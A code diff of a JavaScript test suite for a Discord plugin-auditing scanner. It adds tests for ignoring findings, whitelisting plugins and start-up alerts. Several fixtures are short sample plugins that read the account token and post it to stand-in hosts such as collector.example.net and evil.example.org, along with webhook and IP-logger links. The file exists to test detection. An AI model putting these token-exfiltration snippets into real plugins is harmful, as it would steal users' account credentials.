@@ -123,6 +123,23 @@ const has = (s, rule) => s.findings.some(f => f.rule === rule)
 	check('the score grows with the findings and is capped at 100', clean.score === 0 && token.score > 0 && scan('t.big', 'getToken();eval(1);HTTP.post({url:1});fetch(1);Clipboard.getString();writeFile(1);confirmInstallFile(1);fetch("https://x.example.org")').score === 100)
 }
 
+// --- Ignoring findings (judge)
+{
+	const base = scan('t.j', 'var t=getToken();fetch("https://collector.example.net/x",{method:"POST"})')
+	const none = kit.judge(base, [])
+	check('with nothing ignored the scan is returned as it is', none.risk === base.risk && none.findings === base.findings && none.ignored.length === 0 && base.risk === 'critical')
+	const noToken = kit.judge(base, ['token.read'])
+	check('ignoring the token finding takes the token combo with it and lowers the risk to what is left', noToken.combos.length === 0 && noToken.risk === 'medium' && noToken.ignored.map(f => f.rule).join() === 'token.read', noToken)
+	check('a combo whose other parts are ignored stays if its own finding stays', kit.judge(base, ['net.fetch']).combos.length === 1 && kit.judge(base, ['net.fetch']).risk === 'critical')
+	check('ignoring everything leaves a clean plugin', kit.judge(base, base.findings.map(f => kit.findingKey(f))).risk === 'clean')
+	check('ignoring a key the plugin does not have changes nothing', kit.judge(base, ['code.eval']).risk === 'critical')
+	check('the scan itself is never changed by judging', base.findings.length === 3 && base.combos.length === 1)
+	const two = scan('t.two', 'x="https://discord.com/api/webhooks/1/a";y="https://grabify.link/zz"')
+	const keys = two.findings.filter(f => f.rule === 'exfil.link').map(f => kit.findingKey(f))
+	check('each kind of suspicious link has its own key, so a webhook can be ignored without ignoring an IP logger', keys.length === 2 && new Set(keys).size === 2 && kit.judge(two, [keys[0]]).risk === 'critical' && kit.judge(two, keys).risk === 'clean', keys)
+	check('needsAttention is high or critical and not whitelisted', kit.needsAttention('high', false) && kit.needsAttention('critical', false) && !kit.needsAttention('medium', false) && !kit.needsAttention('critical', true) && !kit.needsAttention('clean', false))
+}
+
 // --- Links
 {
 	const links = code => kit.findLinks(code)
@@ -368,7 +385,7 @@ async function pluginTests(real) {
 		const manifest = JSON.parse(fs.readFileSync(path.join(ROOT, 'plugins', 'plugin-auditor', 'manifest.json'), 'utf8'))
 		const cleanups = []
 		const errors = []
-		const self = { manifest: { ...manifest, version: { nums: [1, 0, 2] } }, errors, reportError: e => errors.push(e), requireReload() {}, startedLate: false }
+		const self = { manifest: { ...manifest, version: { nums: [1, 0, 3] } }, errors, reportError: e => errors.push(e), requireReload() {}, startedLate: false }
 		const api = { cleanup: (...fns) => cleanups.push(...fns), decorate() {}, jsonStorage: storage, logger: { log() {}, warn() {}, error() {}, info() {}, debug() {} }, plugin: self, unscoped: runtime.valenced }
 		self.api = api
 		await definition.start.call(self, { ...api, plugin: self })
@@ -513,27 +530,99 @@ async function pluginTests(real) {
 		button(sheet, 'Copy report').props.onPress()
 		check('the sheet can copy its own report', s.copied.at(-1).startsWith('Totally Legit 1.0.0 (bad.stealer) by tester') && s.copied.at(-1).includes('Risk: Critical'))
 
-		// accept
-		button(sheet, 'I checked it').props.onPress()
+		// whitelist
+		check('the sheet offers Whitelist and an Ignore button under each finding', !!button(sheet, 'Whitelist') && findNodes(sheet.tree, n => n.type === 'Design.Button' && n.props.text === 'Ignore this').length === 4, findNodes(sheet.tree, n => n.type === 'Design.Button').map(n => n.props.text))
+		button(sheet, 'Whitelist').props.onPress()
 		await sleep(10)
 		await sheet.settle()
-		check('"I checked it" saves the plugin with the hash of its code', s.storage.cache.trusted['bad.stealer'] === hash, s.storage.cache.trusted)
-		check('and the plugin no longer counts as needing attention', /1 plugin needs attention/.test(textOf((await s.mountSettings()).tree)))
-		button(sheet, 'Stop accepting').props.onPress()
+		check('Whitelist saves the plugin by id, not by its code', s.storage.cache.whitelist['bad.stealer'] === true, s.storage.cache.whitelist)
+		check('the sheet then says WHITELISTED and offers to remove it', textOf(sheet.tree).includes('WHITELISTED') && !!button(sheet, 'Remove whitelist'))
+		check('the report marks it as whitelisted', /Risk: Critical \(whitelisted by the user\)/.test(s.copied.at(-1) && (button(sheet, 'Copy report').props.onPress(), s.copied.at(-1))))
+		button(sheet, 'Remove whitelist').props.onPress()
 		await sleep(10)
-		check('"Stop accepting" really removes it (not merged back)', !('bad.stealer' in s.storage.cache.trusted), s.storage.cache.trusted)
+		check('Remove whitelist really removes it (not merged back)', !('bad.stealer' in s.storage.cache.whitelist), s.storage.cache.whitelist)
+
+		// ignore one finding
+		const ignoreButtons = () => findNodes(sheet.tree, n => n.type === 'Design.Button' && n.props.text === 'Ignore this')
+		const before = textOf(sheet.tree)
+		check('before ignoring, the token finding and the combo are shown', before.includes('Reads your account token') && before.includes('Can read your token and reach the internet'))
+		// The first finding of this plugin is the critical-or-high one; find the button under "Reads your account token".
+		const tokenCard = findNode(sheet.tree, n => n.type === 'View' && textOf(n).includes('Reads your account token') && findNodes(n, m => m.type === 'Design.Button' && m.props.text === 'Ignore this').length === 1)
+		findNode(tokenCard, n => n.type === 'Design.Button' && n.props.text === 'Ignore this').props.onPress()
+		await sleep(10)
+		await sheet.settle()
+		check('ignoring saves that finding for that plugin', JSON.stringify(s.storage.cache.ignored) === JSON.stringify({ 'bad.stealer': ['token.read'] }), s.storage.cache.ignored)
+		const after = textOf(sheet.tree)
+		check('the ignored finding moves to an Ignored section and its combo goes with it', after.includes('IGNORED') && !!button(sheet, 'Notice again') && !after.includes('Can read your token and reach the internet'), after.slice(0, 700))
+		check('the other findings stay, so a different problem still shows', after.includes('Makes POST, PUT, PATCH or DELETE requests') && after.includes('Uses the sign-in store'))
+		check('the risk badge follows what is left (no longer critical)', !textOf(sheet.tree).includes('CRITICAL') && ignoreButtons().length === 3, textOf(sheet.tree).slice(0, 200))
+		check('the report notes what the user ignores', (button(sheet, 'Copy report').props.onPress(), /1 finding\(s\) ignored by the user/.test(s.copied.at(-1)) && /\(ignored\) Reads your account token/.test(s.copied.at(-1))), s.copied.at(-1))
+		findNode(sheet.tree, n => n.type === 'Design.Button' && n.props.text === 'Notice again').props.onPress()
+		await sleep(10)
+		check('Notice again brings it back for real (not merged back)', !('bad.stealer' in s.storage.cache.ignored), s.storage.cache.ignored)
 		await s.running.stop()
 	}
 
-	// --- Changed code is no longer accepted
+	// --- The whitelist survives an update; ignoring is per finding; the Options tab lists both
 	{
-		const s = await setup({ saved: { trusted: { 'bad.stealer': 'oldhash' } } })
+		const s = await setup({ saved: { whitelist: { 'bad.stealer': true }, ignored: { 'bad.hook': ['exfil.link:Has a Discord webhook'] } } })
 		const view = await s.mountSettings()
 		await press(view, 'Scan now')
 		await sleep(50)
 		await view.settle()
-		check('an accepted plugin whose code changed counts again', /2 plugins need attention/.test(textOf(view.tree)))
+		check('with one whitelisted and the webhook ignored nothing needs attention', /No serious problems found/.test(textOf(view.tree)), textOf(view.tree).slice(0, 250))
+		findNode(view.tree, n => n.type === 'Pressable' && textOf(n).startsWith('All')).props.onPress()
+		await view.settle()
+		check('a whitelisted plugin keeps its real risk badge and its row says Whitelisted', /Whitelisted · /.test(row(view, 'Totally Legit').props.subLabel) && findNode(row(view, 'Totally Legit').props.trailing, n => true) !== undefined, row(view, 'Totally Legit').props)
+		await openTab(view, 'Options')
+		const rows = findNodes(view.tree, n => n.type === 'Design.TableRow').map(n => `${n.props.label}|${n.props.subLabel}`)
+		check('the Options tab lists the whitelisted plugin', rows.includes('Totally Legit|bad.stealer'), rows)
+		check('and the ignored finding by its title with its plugin', rows.includes('Has a Discord webhook|Hook Sender'), rows)
+		findNode(view.tree, n => n.type === 'Design.TableRow' && n.props.label === 'Has a Discord webhook').props.onPress()
+		await sleep(10)
+		check('tapping an ignored finding there notices it again', Object.keys(s.storage.cache.ignored).length === 0, s.storage.cache.ignored)
+		findNode(view.tree, n => n.type === 'Design.TableRow' && n.props.label === 'Totally Legit').props.onPress()
+		await sleep(10)
+		check('tapping a whitelisted plugin there removes it', Object.keys(s.storage.cache.whitelist).length === 0, s.storage.cache.whitelist)
 		await s.running.stop()
+	}
+
+	// --- The start-up alert
+	{
+		const realSetTimeout = globalThis.setTimeout
+		// The harness sleep() uses the patched timer, so waiting for the scan uses the real one.
+		const pause = ms => new Promise(resolve => realSetTimeout(resolve, ms))
+		globalThis.setTimeout = (fn, ms, ...rest) => realSetTimeout(fn, ms > 50 ? 0 : ms, ...rest)
+		try {
+			const toastsOf = s => s.runtime.log.actions.filter(a => a.label === 'toast').map(a => a.args[1]?.text)
+			const s = await setup({ saved: { autoScan: true, notify: true } })
+			await pause(150)
+			check('the start-up scan names the plugins that are high or critical', toastsOf(s).some(t => /Totally Legit, Hook Sender need attention\. See Plugin Auditor\./.test(t)), toastsOf(s))
+			check('and does not name medium, low or clean plugins', !toastsOf(s).some(t => /Good Reminders|Twin|No Code/.test(t)))
+			await s.running.stop()
+
+			const w = await setup({ saved: { autoScan: true, notify: true, whitelist: { 'bad.stealer': true } } })
+			await pause(150)
+			check('a whitelisted plugin is left out of the alert', toastsOf(w).some(t => /^Hook Sender needs attention\./.test(t)) && !toastsOf(w).some(t => /Totally Legit/.test(t)), toastsOf(w))
+			await w.running.stop()
+
+			const all = await setup({ saved: { autoScan: true, notify: true, whitelist: { 'bad.stealer': true, 'bad.hook': true } } })
+			await pause(150)
+			check('with every serious plugin whitelisted there is no alert at all', toastsOf(all).length === 0, toastsOf(all))
+			await all.running.stop()
+
+			const off = await setup({ saved: { autoScan: true, notify: false } })
+			await pause(150)
+			check('with alerts off there is no toast', toastsOf(off).length === 0)
+			await off.running.stop()
+
+			const many = await setup({ saved: { autoScan: true, notify: true }, list: ['a', 'b', 'c', 'd'].map(n => nativeEntry(plugin(`m.${n}`, 'getToken();fetch("https://evil.example.org/x")', { name: `Bad ${n}` }))) })
+			await pause(150)
+			check('four serious plugins are named two at a time with a count', toastsOf(many).some(t => /^Bad a, Bad b \+2 need attention\./.test(t)), toastsOf(many))
+			await many.running.stop()
+		} finally {
+			globalThis.setTimeout = realSetTimeout
+		}
 	}
 
 	// --- VirusTotal from the sheet
@@ -663,7 +752,7 @@ async function pluginTests(real) {
 		await view.settle()
 		findNode(view.tree, n => n.type === 'Design.Button' && n.props.text === 'Copy logs').props.onPress()
 		const report = s.copied.at(-1)
-		check('the debug report names the plugin, the phone and Discord', report.startsWith('Plugin Auditor debug report') && report.includes('marklong.plugin-auditor 1.0.2') && report.includes('Discord: 354.5'), report.slice(0, 400))
+		check('the debug report names the plugin, the phone and Discord', report.startsWith('Plugin Auditor debug report') && report.includes('marklong.plugin-auditor 1.0.3') && report.includes('Discord: 354.5'), report.slice(0, 400))
 		check('it shows how the scan went', report.includes('Plugin list: native list') && report.includes('Scanned: 6 plugins, 1 duplicate group(s)') && /Rules: \d+/.test(report) && report.includes('Slowest:'), report)
 		check('it lists every plugin with risk, counts, size and a short hash but no code', /bad\.stealer 1\.0\.0 critical \d+f \d+l \d+ch [0-9a-f]{10}/.test(report) && !report.includes('collector.example.net/t?x'), report)
 		check('it says which plugin Valenced gave no code for', report.includes('No code from Valenced for: empty.nocode'))
